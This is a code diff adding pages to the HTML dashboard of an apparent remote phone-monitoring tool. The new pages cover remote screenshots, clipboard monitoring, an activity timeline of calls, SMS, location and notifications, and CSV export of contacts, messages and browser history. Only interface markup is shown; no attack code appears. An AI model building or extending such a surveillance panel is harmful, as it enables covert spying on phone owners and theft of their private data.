@@ -98,6 +98,38 @@
         </div>
 
         <div class="nav-section">
+          <div class="nav-section-title">Advanced</div>
+          <a class="nav-item" data-page="screenshot" onclick="navigateTo('screenshot')">
+            <span class="icon">🖥️</span>
+            <span>Screenshot</span>
+          </a>
+          <a class="nav-item" data-page="geofence" onclick="navigateTo('geofence')">
+            <span class="icon">🛑</span>
+            <span>Geofence</span>
+          </a>
+          <a class="nav-item" data-page="batteryalerts" onclick="navigateTo('batteryalerts')">
+            <span class="icon">⚡</span>
+            <span>Battery Alerts</span>
+          </a>
+          <a class="nav-item" data-page="timeline" onclick="navigateTo('timeline')">
+            <span class="icon">📊</span>
+            <span>Activity Timeline</span>
+          </a>
+          <a class="nav-item" data-page="clipmonitor" onclick="navigateTo('clipmonitor')">
+            <span class="icon">📋</span>
+            <span>Clipboard Monitor</span>
+          </a>
+          <a class="nav-item" data-page="speedtest" onclick="navigateTo('speedtest')">
+            <span class="icon">🚀</span>
+            <span>Speed Test</span>
+          </a>
+          <a class="nav-item" data-page="exportdata" onclick="navigateTo('exportdata')">
+            <span class="icon">📥</span>
+            <span>Export Data</span>
+          </a>
+        </div>
+
+        <div class="nav-section">
           <div class="nav-section-title">Tools</div>
           <a class="nav-item" data-page="telegram" onclick="navigateTo('telegram')">
             <span class="icon">✈️</span>
@@ -119,6 +151,10 @@
       </nav>
 
       <div class="sidebar-footer">
+        <div class="theme-toggle" onclick="toggleTheme()" style="display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(139,92,246,0.1);border:1px solid rgba(139,92,246,0.2);border-radius:8px;color:#a78bfa;font-size:13px;cursor:pointer;margin-bottom:10px;transition:all 0.3s ease">
+          <span id="themeIcon">🌙</span>
+          <span id="themeLabel">Dark Mode</span>
+        </div>
         <a class="agent-link" href="/agent" target="_blank">
           <span>📲</span>
           <span>Open Agent on Device</span>
@@ -894,6 +930,304 @@
         <div id="simInfoContent">
           <div class="card" style="text-align:center;padding:40px">
             <p style="color:var(--text-muted)">Select a device and click "Get SIM Info" to view SIM details</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ SCREENSHOT ============ -->
+      <section class="page-section" id="page-screenshot">
+        <div class="page-header">
+          <div>
+            <h2>Screenshot Capture</h2>
+            <p class="subtitle">Take remote screenshot of device screen / Device ki screen capture karein</p>
+          </div>
+          <select class="select-device" id="screenshotDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="takeScreenshot()">
+            <span>🖥️</span> Take Screenshot
+          </button>
+          <button class="btn btn-outline" onclick="downloadScreenshot()">
+            <span>⬇️</span> Download Last
+          </button>
+        </div>
+
+        <div class="card">
+          <div id="screenshotContainer" style="text-align:center;min-height:300px;display:flex;align-items:center;justify-content:center">
+            <div class="empty-state" style="padding:40px">
+              <div class="icon">🖥️</div>
+              <h3>No Screenshot</h3>
+              <p>Select a device and take a screenshot</p>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px">
+          <h3 style="font-size:16px;margin-bottom:12px">Screenshot History</h3>
+          <div class="captured-photos" id="screenshotHistory">
+            <div class="empty-state" style="padding:20px"><p>No screenshots yet</p></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ GEOFENCE ============ -->
+      <section class="page-section" id="page-geofence">
+        <div class="page-header">
+          <div>
+            <h2>Geofence Alerts</h2>
+            <p class="subtitle">Set virtual boundaries and get alerts / Virtual boundary set karein</p>
+          </div>
+          <select class="select-device" id="geofenceDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div class="grid-2">
+          <div class="card">
+            <h3 style="margin-bottom:16px">Set Geofence Zone</h3>
+            <div style="display:grid;gap:10px">
+              <input type="text" id="geofenceName" placeholder="Zone name (e.g. Home, Office)" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--bg-card);color:var(--text-primary)">
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+                <input type="number" id="geofenceLat" placeholder="Latitude" step="0.000001" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--bg-card);color:var(--text-primary)">
+                <input type="number" id="geofenceLng" placeholder="Longitude" step="0.000001" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--bg-card);color:var(--text-primary)">
+              </div>
+              <div style="display:flex;align-items:center;gap:10px">
+                <input type="range" id="geofenceRadius" min="50" max="5000" value="500" style="flex:1" oninput="document.getElementById('geofenceRadiusVal').textContent=this.value+'m'">
+                <span id="geofenceRadiusVal" style="font-size:13px;color:var(--text-secondary);min-width:60px">500m</span>
+              </div>
+              <button class="btn btn-primary" onclick="useCurrentLocationForGeofence()">📍 Use Device Current Location</button>
+              <div style="display:flex;gap:10px">
+                <button class="btn btn-primary" onclick="setGeofence()" style="flex:1">Set Geofence</button>
+                <button class="btn btn-danger" onclick="clearGeofence()">Clear</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <h3 style="margin-bottom:16px">Geofence Status</h3>
+            <div id="geofenceStatus" style="padding:20px;text-align:center;color:var(--text-muted)">
+              <p>No geofence set</p>
+            </div>
+            <div id="geofenceAlerts" style="margin-top:16px">
+              <h4 style="font-size:14px;color:var(--text-secondary);margin-bottom:10px">Recent Alerts</h4>
+              <div class="call-log-list" id="geofenceAlertList">
+                <div style="text-align:center;padding:20px;color:var(--text-muted);font-size:13px">No alerts yet</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ BATTERY ALERTS ============ -->
+      <section class="page-section" id="page-batteryalerts">
+        <div class="page-header">
+          <div>
+            <h2>Battery Alerts</h2>
+            <p class="subtitle">Get notified when battery drops below threshold / Battery kam hone par alert</p>
+          </div>
+          <select class="select-device" id="batteryAlertDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div class="grid-2">
+          <div class="card">
+            <h3 style="margin-bottom:16px">Set Battery Alert</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">You'll be notified when battery drops below the set level</p>
+            <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
+              <span style="font-size:32px">🔋</span>
+              <input type="range" id="batteryThreshold" min="5" max="50" value="20" style="flex:1" oninput="document.getElementById('batteryThresholdVal').textContent=this.value+'%'">
+              <span id="batteryThresholdVal" style="font-size:18px;font-weight:700;min-width:50px">20%</span>
+            </div>
+            <div style="display:flex;gap:10px">
+              <button class="btn btn-primary" onclick="setBatteryAlert()" style="flex:1">Set Alert</button>
+              <button class="btn btn-danger" onclick="clearBatteryAlert()">Clear</button>
+            </div>
+          </div>
+
+          <div class="card">
+            <h3 style="margin-bottom:16px">Alert History</h3>
+            <div class="call-log-list" id="batteryAlertList">
+              <div class="empty-state" style="padding:40px">
+                <div class="icon">⚡</div>
+                <h3>No Battery Alerts</h3>
+                <p>Alerts will appear here when battery drops below threshold</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ ACTIVITY TIMELINE ============ -->
+      <section class="page-section" id="page-timeline">
+        <div class="page-header">
+          <div>
+            <h2>Activity Timeline</h2>
+            <p class="subtitle">Chronological log of all device activity / Saari device activity ka log</p>
+          </div>
+          <select class="select-device" id="timelineDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
+          <button class="btn btn-primary" onclick="fetchTimeline()">
+            <span>📊</span> Fetch Timeline
+          </button>
+          <button class="btn btn-outline" onclick="clearTimeline()">
+            <span>🗑️</span> Clear
+          </button>
+          <select id="timelineFilter" onchange="filterTimeline()" style="padding:8px 14px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:var(--text-primary);font-size:13px">
+            <option value="all">All Events</option>
+            <option value="call">Calls</option>
+            <option value="sms">SMS</option>
+            <option value="gps">Location</option>
+            <option value="camera">Camera</option>
+            <option value="battery">Battery</option>
+            <option value="app">Apps</option>
+            <option value="clipboard">Clipboard</option>
+            <option value="notification">Notifications</option>
+          </select>
+          <span id="timelineCount" style="font-size:13px;color:var(--text-secondary)"></span>
+        </div>
+
+        <div class="timeline-container" id="timelineContainer">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">📊</div>
+            <h3>No Activity</h3>
+            <p>Select a device and fetch timeline to see activity log</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ CLIPBOARD MONITOR ============ -->
+      <section class="page-section" id="page-clipmonitor">
+        <div class="page-header">
+          <div>
+            <h2>Clipboard Monitor</h2>
+            <p class="subtitle">Track real-time clipboard changes / Clipboard ki har copy track karein</p>
+          </div>
+          <select class="select-device" id="clipmonitorDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" id="btnClipMonitor" onclick="toggleClipMonitor()">
+            <span>📋</span> Start Monitoring
+          </button>
+          <span id="clipMonitorStatus" style="font-size:13px;color:var(--text-muted);align-self:center">Not active</span>
+        </div>
+
+        <div class="call-log-list" id="clipboardHistory">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">📋</div>
+            <h3>No Clipboard Data</h3>
+            <p>Start monitoring to capture clipboard changes</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ SPEED TEST ============ -->
+      <section class="page-section" id="page-speedtest">
+        <div class="page-header">
+          <div>
+            <h2>Network Speed Test</h2>
+            <p class="subtitle">Test device internet speed / Device ki internet speed check karein</p>
+          </div>
+          <select class="select-device" id="speedtestDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px">
+          <button class="btn btn-primary" id="btnSpeedTest" onclick="runSpeedTest()">
+            <span>🚀</span> Run Speed Test
+          </button>
+        </div>
+
+        <div class="grid-3" id="speedTestResults">
+          <div class="stat-card">
+            <div class="stat-icon blue">⬇️</div>
+            <div class="stat-info">
+              <h4 id="speedDownload">--</h4>
+              <p>Download (Mbps)</p>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon green">⬆️</div>
+            <div class="stat-info">
+              <h4 id="speedUpload">--</h4>
+              <p>Upload (Mbps)</p>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon yellow">⏱️</div>
+            <div class="stat-info">
+              <h4 id="speedLatency">--</h4>
+              <p>Latency (ms)</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:20px">
+          <h3 style="margin-bottom:16px">Speed Test History</h3>
+          <div class="call-log-list" id="speedTestHistory">
+            <div class="empty-state" style="padding:30px">
+              <p>No speed tests run yet</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ EXPORT DATA ============ -->
+      <section class="page-section" id="page-exportdata">
+        <div class="page-header">
+          <div>
+            <h2>Export Data</h2>
+            <p class="subtitle">Export device data as CSV files / Data ko CSV mein download karein</p>
+          </div>
+        </div>
+
+        <div class="grid-3">
+          <div class="card" style="text-align:center;padding:30px">
+            <div style="font-size:48px;margin-bottom:12px">👥</div>
+            <h3 style="margin-bottom:8px">Contacts</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">Export all fetched contacts</p>
+            <button class="btn btn-primary" onclick="exportCSV('contacts')">Download CSV</button>
+          </div>
+          <div class="card" style="text-align:center;padding:30px">
+            <div style="font-size:48px;margin-bottom:12px">📞</div>
+            <h3 style="margin-bottom:8px">Call Log</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">Export call history</p>
+            <button class="btn btn-primary" onclick="exportCSV('calllog')">Download CSV</button>
+          </div>
+          <div class="card" style="text-align:center;padding:30px">
+            <div style="font-size:48px;margin-bottom:12px">💬</div>
+            <h3 style="margin-bottom:8px">SMS Messages</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">Export SMS messages</p>
+            <button class="btn btn-primary" onclick="exportCSV('sms')">Download CSV</button>
+          </div>
+          <div class="card" style="text-align:center;padding:30px">
+            <div style="font-size:48px;margin-bottom:12px">💻</div>
+            <h3 style="margin-bottom:8px">Installed Apps</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">Export app list</p>
+            <button class="btn btn-primary" onclick="exportCSV('apps')">Download CSV</button>
+          </div>
+          <div class="card" style="text-align:center;padding:30px">
+            <div style="font-size:48px;margin-bottom:12px">🕐</div>
+            <h3 style="margin-bottom:8px">Browser History</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">Export browsing history</p>
+            <button class="btn btn-primary" onclick="exportCSV('history')">Download CSV</button>
+          </div>
+          <div class="card" style="text-align:center;padding:30px">
+            <div style="font-size:48px;margin-bottom:12px">📊</div>
+            <h3 style="margin-bottom:8px">Activity Timeline</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">Export full activity log</p>
+            <button class="btn btn-primary" onclick="exportCSV('timeline')">Download CSV</button>
           </div>
         </div>
       </section>
